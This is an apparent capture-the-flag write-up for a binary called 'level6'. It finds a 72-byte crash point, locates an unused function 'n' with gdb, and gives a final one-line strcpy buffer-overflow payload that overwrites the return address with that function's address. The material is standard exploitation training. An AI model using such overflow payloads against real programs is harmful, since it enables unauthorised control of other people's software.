When trying to execute the binary we can see that it segfault
if the string passed is 72+bytes long.
    $ ./level6 $(ruby -e 'print "A" * 71')
    $ Nope
    $ ./level6 $(ruby -e 'print "A" * 72')
    $ Segmentation fault (core dumped)

With '(gdb) info functions' we can see2 functions, 'm' and 'n'.
    0x08048454  n
    0x08048468  m
    0x0804847c  main

Function 'm' is called in 'main' but function 'n' is never used so we will try to call it.
We will use the strcpy vulnerability to buffer overflow and pass the 'n' function address.

$ ./level6 $(ruby -e 'print "A" * 72 + "\x54\x84\x04\x08"')
